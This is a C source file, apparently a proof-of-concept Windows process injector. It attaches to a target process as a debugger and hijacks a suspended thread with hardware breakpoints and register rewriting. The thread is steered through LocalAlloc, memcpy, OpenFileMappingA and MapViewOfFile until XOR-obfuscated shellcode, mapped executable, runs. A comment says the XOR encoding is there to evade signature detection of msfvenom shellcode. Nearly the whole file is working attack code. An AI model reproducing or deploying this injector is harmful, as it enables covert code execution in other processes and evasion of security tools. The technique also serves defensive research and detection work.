#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <psapi.h>
#include <ntdef.h>

#include "shellcode.h"

#define SECTION_NAME "MZ"
// #define DEBUG

#ifdef DEBUG
    #define DBG_PRINT(fmt, ...) \
    do { fprintf(stderr, "[DBG] " fmt, ##__VA_ARGS__); } while (0)
#else
    #define DBG_PRINT(fmt, ...) do { } while (0)
#endif

// global initialization
HANDLE  g_hTargetProcess = NULL;
HANDLE  g_hTargetThread = NULL;
DWORD   g_dwThreadId = 0;

#pragma optimize("", off)
void xor_decrypt(unsigned char *data, const size_t data_len, const unsigned char *key, const size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}
#pragma optimize("", on)

void DebugLoop(void) {
    DEBUG_EVENT de;
    int stage = 0;
    HANDLE  hRemoteHandle = NULL;
    DWORD64 dw64MzStringCopy = 0;
    DWORD64 dw64SavedRsp = 0;
    DWORD64 dw64SavedRetAddr = 0;
    DWORD64 dw64ShellcodeBase = 0;

    ResumeThread(g_hTargetThread);

    while (WaitForDebugEvent(&de, 10*1000)) {
        const DWORD continueStatus = DBG_CONTINUE;

        if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            const EXCEPTION_RECORD* er = &de.u.Exception.ExceptionRecord;

            if (er->ExceptionCode == EXCEPTION_SINGLE_STEP && de.dwThreadId == g_dwThreadId) {

                CONTEXT ctx = { 0 };
                ctx.ContextFlags = CONTEXT_ALL;
                GetThreadContext(g_hTargetThread, &ctx);

                if (stage == 0) {
                    printf("[i] Execution Redirected:\n");
                    printf("|-> [0] Preparation & anchoring stack\n");

                    // Save the stack pointer to roll back later
                    dw64SavedRsp = ctx.Rsp;
                    DBG_PRINT("[i] Anchoring Stack at: 0x%llx\n", dw64SavedRsp);

                    // here we use DbgBreakPoint which should only be [ int3, ret ]
                    // So by setting the trap flag and setting the Rip to DbgBreakPoint+1 (the <ret>),
                    // the next debug event should happen at the return address of our current stack.
                    // If we store the Rip of the next event and roll back the stack state, we know the return address without reading it directly.
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "DbgBreakPoint") + 1;
                    ctx.EFlags |= 0x100; // Set trap flag

                    SetThreadContext(g_hTargetThread, &ctx);

                    stage = 1;
                }

                else if (stage == 1) {
                    // This stage is used as initialization of the technique
                    // We set a HWBP as a "checkpoint" so that we get notified after a stage is done / has called a function.
                    // After setting the HWBP we allocate memory in the target process which will hold the name of the FileMapping.
                    printf("|-> [1] Setting HWBP & buffer alloc\n");

                    // Now we have the return address of the previously saved stack state
                    dw64SavedRetAddr = ctx.Rip;
                    DBG_PRINT("[i] Constant Return Addr: 0x%llx\n", dw64SavedRetAddr);

                    // Rollback stack
                    ctx.Rsp = dw64SavedRsp;

                    // Reset TF
                    ctx.EFlags &= ~0x100;

                    // Set HWBP on the return address of the anchored stack state
                    ctx.Dr0 = (DWORD64)dw64SavedRetAddr;
                    ctx.Dr7 = (1ULL << 0);       // Enable G0 (Global breakpoint 0)
                    ctx.Dr7 &= ~(3ULL << 16);    // Execute breakpoint
                    ctx.Dr6 = 0;                 // Clear status

                    // LocalAlloc(LPTR, 3)
                    ctx.Rcx = LPTR;
                    ctx.Rdx = 3;
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalAlloc");

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 2;
                }

                else if (stage == 2 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
                    // This stage simply copies the file mapping name 'MZ' into the allocated buffer
                    // We use 'MZ', since these chars are always at the start of a PE file, so it's guaranteed to exist, and we easily know where it is.
                    printf("|-> [2] Copying File-Mapping name\n");

                    // Rax now holds the address of our allocated space
                    dw64MzStringCopy = ctx.Rax;
                    DBG_PRINT("[i] LocalAlloc returned:  0x%llx\n", dw64MzStringCopy);
                    if (!dw64MzStringCopy) { printf("[!] LocalAlloc failed\n"); break; }

                    // Rollback stack
                    ctx.Rsp = dw64SavedRsp;

                    // memcpy(pvMzStringCopy, <kernel32 base>, 2)
                    ctx.Rcx = (DWORD64)dw64MzStringCopy;
                    ctx.Rdx = (DWORD64)GetModuleHandleA("kernel32.dll");
                    ctx.R8  = 2;
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 3;
                }

                else if (stage == 3 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
                    // Stage 3 prepares our anchored stack for a later call.
                    // On windows if your code calls a function, arguments 1-4 are passed via registers.
                    // Any following arguments are passed via the stack.
                    // So to make sure the call in stage 5 doesn't fail because of bad arguments, we prepare it here.
                    printf("|-> [3] Zeroing stack slot\n");

                    // Rollback stack
                    ctx.Rsp = dw64SavedRsp;

                    // memset(ctx.Rsp+0x28, 0, sizeof(DWORD);
                    ctx.Rcx = ctx.Rsp+0x28;
                    ctx.Rdx = 0;
                    ctx.R8  = sizeof(DWORD64);
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "memset");

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 4;
                }

                else if (stage == 4 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
                    // This stage will open the File Mapping we created in the main function of this PoC.
                    // We pass the string pointer, which we allocated and populated in the previous stages.
                    printf("|-> [4] Opening handle to named file mapping\n");

                    // Rollback stack
                    ctx.Rsp = dw64SavedRsp;

                    // OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, pvMzStringCopy)
                    ctx.Rcx = FILE_MAP_ALL_ACCESS;
                    ctx.Rdx = FALSE;
                    ctx.R8  = dw64MzStringCopy;
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OpenFileMappingA");

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 5;
                }

                else if (stage == 5 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
                    // Stage five reads from the file mapping and creates an executable section from it using MapViewOfFile.
                    // The function uses >4 arguments, which is why we had to prepare the stack in stage 3.
                    printf("|-> [5] Mapping payload into mem. with exec. perm.\n");

                    // Rax holds the handle returned by OpenFileMappingA
                    hRemoteHandle = (HANDLE)ctx.Rax;
                    if (!hRemoteHandle) { printf("[!] OpenFileMappingA failed\n"); break; }
                    DBG_PRINT("[i] FileMapping Handle: 0x%p\n", hRemoteHandle);

                    // Have you listened to the new Bones (TEAM SESH) album yet?
                    // Rollback stack
                    ctx.Rsp = dw64SavedRsp;

                    // MapViewOfFile(handle, perm, 0, 0, 0)
                    ctx.Rcx = (DWORD64)hRemoteHandle;
                    ctx.Rdx = FILE_MAP_EXECUTE | FILE_MAP_READ;
                    ctx.R8 = 0; ctx.R9 = 0;
                    // The fifth argument is passed via the stack, which we prepared to be set to 0 in stage 3.
                    ctx.Rip = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "MapViewOfFile");

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 6;
                }

                else if (stage == 6 && er->ExceptionAddress == (PVOID)dw64SavedRetAddr) {
                    // Stage 6 is the actual shellcode execution. Additionally, it clears the HWBP.
                    printf("|-> [6] Cleanup & shellcode execution\n");

                    // Rax should hold the pointer to the executable section (returned by MapViewOfFile)
                    dw64ShellcodeBase = ctx.Rax;
                    if (!dw64ShellcodeBase) { printf("[!] MapViewOfFile failed\n"); break; }
                    DBG_PRINT("[i] Shellcode at: 0x%llx.\n", dw64ShellcodeBase);

                    ctx.Rip = (DWORD64)dw64ShellcodeBase;

                    // Clear HWBP
                    ctx.Dr0 = 0;
                    ctx.Dr7 = 0;

                    SetThreadContext(g_hTargetThread, &ctx);
                    stage = 7;
                }
            }
        }

        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, continueStatus);
        if (stage == 7) { break; }
    }
}

int main(const int argc, char **argv) {
    if (argc < 2) {
        printf("[!] Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    const DWORD pid = strtol(argv[1], NULL, 10);

    // First we map the shellcode into a section
    HANDLE hSection = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), SECTION_NAME);
    PVOID localView = MapViewOfFile(hSection, FILE_MAP_WRITE, 0, 0, 0);

    // I XORed the payload for development sakes, as I used the basic msfvenom exec shellcode,
    // and didn't want the technique to be stopped because of the shellcode signature.
    xor_decrypt(payload, sizeof(payload), xor_key, sizeof(xor_key));

    memcpy(localView, payload, sizeof(payload));
    printf("[i] Section '%s' created and shellcode copied\n", SECTION_NAME);

    g_hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!DebugActiveProcess(pid)) {
        printf("[!] Failed to attach as debugger\n");
        return 1;
    }

    DebugSetProcessKillOnExit(FALSE);

    const void* pvArbitFunc =  GetProcAddress(GetModuleHandleA("kernel32.dll"), "FileTimeToSystemTime");
    g_hTargetThread = CreateRemoteThread(g_hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvArbitFunc, NULL, CREATE_SUSPENDED, NULL);
    g_dwThreadId = GetThreadId(g_hTargetThread);

    printf("[+] Bait thread created. Setting HWBP on FileTimeToSystemTime\n");

    // Set HWBP on the arbitrary function
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(g_hTargetThread, &ctx)) return FALSE;
    ctx.Dr0 = (DWORD64)pvArbitFunc;
    ctx.Dr7 = (1ULL << 0);
    ctx.Dr7 &= ~(3ULL << 16);
    SetThreadContext(g_hTargetThread, &ctx);

    DebugLoop(); // Main "injection" logic

    if (DebugActiveProcessStop(pid)) {
        printf("[+] Successfully detached from process %lu\n", pid);
    } else {
        printf("[!] Failed to detach. Target might crash\n");
    }

    printf("[i] Orchestration complete.\n");
    return 0;
}